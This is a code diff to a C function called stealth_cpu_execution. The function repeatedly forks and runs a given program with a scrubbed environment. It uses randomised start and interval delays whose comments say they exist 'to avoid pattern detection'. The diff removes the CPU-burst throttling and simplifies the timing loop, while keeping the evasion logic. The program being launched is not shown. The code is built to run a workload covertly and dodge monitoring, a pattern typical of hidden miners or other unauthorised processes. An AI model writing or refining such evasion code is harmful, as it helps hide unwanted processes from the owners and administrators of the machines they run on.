@@ -436,8 +436,6 @@ int random_delay(int max_seconds) {
 void stealth_cpu_execution(const char *exec_path, char **newargv, int max_cpu_percent, int burst_interval) {
     pid_t pid;
     int status;
-    struct timespec start_time, current_time;
-    long long elapsed_ms;
     
     // Set signal handler for graceful shutdown
     struct sigaction sa;
@@ -454,57 +452,30 @@ void stealth_cpu_execution(const char *exec_path, char **newargv, int max_cpu_pe
                 max_cpu_percent, burst_interval);
     
     // Add random initial delay to avoid pattern detection
-    int initial_delay = random_delay(300); // Up to 5 minutes
+    int initial_delay = random_delay(300);
     log_message("DEBUG", "Initial random delay: %d seconds", initial_delay);
     
     while (stealth_running) {
-        clock_gettime(CLOCK_MONOTONIC, &start_time);
-        
-        // Fork untuk menjalankan proses
         pid = fork();
         if (pid == 0) {
-            // Child process - jalankan program dengan environment bersih
+            // Child process
             clean_environment();
             execv(exec_path, newargv);
             log_message("ERROR", "Failed to execute %s: %s", exec_path, strerror(errno));
             exit(EXIT_FAILURE);
         } else if (pid > 0) {
-            // Parent process - tunggu sebentar kemudian batasi
-            usleep(100000); // Tunggu 100ms untuk proses mulai
-            
-            // Batasi waktu CPU proses child
-            int cpu_time_limit = (burst_interval * max_cpu_percent) / 100;
-            if (cpu_time_limit < 1) cpu_time_limit = 1;
-            
-            sleep(cpu_time_limit);
-            
-            // Hentikan proses child secara graceful
-            kill(pid, SIGTERM);
-            
-            // Tunggu proses child selesai
+            // Parent process - wait for child to complete
             waitpid(pid, &status, 0);
-            
             log_message("DEBUG", "Process completed with status %d", status);
         } else {
             log_message("ERROR", "Fork failed: %s", strerror(errno));
             break;
         }
-        
-        // Hitung waktu yang sudah berlalu dan tunggu jika perlu
-        clock_gettime(CLOCK_MONOTONIC, &current_time);
-        elapsed_ms = (current_time.tv_sec - start_time.tv_sec) * 1000 +
-                     (current_time.tv_nsec - start_time.tv_nsec) / 1000000;
-        
-        int sleep_time = (burst_interval * 1000) - elapsed_ms;
-        if (sleep_time > 0) {
-            // Add some randomness to sleep time to avoid patterns
-            srand(time(NULL) ^ getpid());
-            sleep_time += (rand() % 5000) - 2500; // ±2.5 seconds randomness
-            
-            if (sleep_time > 0) {
-                usleep(sleep_time * 1000);
-            }
-        }
+
+        // Add interval delay with randomness
+        srand(time(NULL) ^ getpid());
+        int sleep_time = burst_interval + (rand() % 10) - 5;
+        sleep(sleep_time);
     }
     
     log_message("INFO", "Stealth execution stopped");
